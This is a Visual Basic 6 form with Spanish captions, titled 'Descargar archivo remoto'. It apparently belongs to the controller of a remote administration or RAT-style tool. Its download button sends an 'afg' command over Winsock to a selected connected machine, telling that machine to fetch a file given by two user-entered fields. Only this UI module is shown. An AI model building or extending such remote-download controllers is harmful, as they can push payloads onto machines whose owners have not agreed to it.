VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Begin VB.Form downloader 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Descargar archivo remoto"
   ClientHeight    =   930
   ClientLeft      =   4560
   ClientTop       =   6720
   ClientWidth     =   3885
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   930
   ScaleWidth      =   3885
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command1 
      Caption         =   "&Cerrar"
      Height          =   255
      Left            =   2040
      TabIndex        =   3
      Top             =   120
      Width           =   1695
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   3000
      OleObjectBlob   =   "downloader.frx":0000
      Top             =   480
   End
   Begin VB.CommandButton Descargar 
      Caption         =   "&Descargar archivo"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   1695
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   2040
      TabIndex        =   1
      Top             =   480
      Width           =   1695
   End
   Begin VB.TextBox Text6 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   1695
   End
End
Attribute VB_Name = "downloader"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim vIndex As Variant
Dim Index_n As Integer

Private Sub Command1_Click()
Unload Me
End Sub

Private Sub Descargar_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    If Not Text1.Text = "" And Not Text6.Text = "" Then
    
        Form1.Winsock1(vIndex(0)).SendData "afg" & Text6.Text & "|" & Text1.Text
        
        Text1.Text = ""
        Text6.Text = ""
        Text6.SetFocus
    Else
        MsgBox "Debe completar ambos campos", vbCritical + vbOKOnly, "Error"
        Text6.SetFocus
    End If
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

Skin1.LoadSkin App.path & "\sk\skin.skn"
Skin1.ApplySkin downloader.hwnd
End Sub
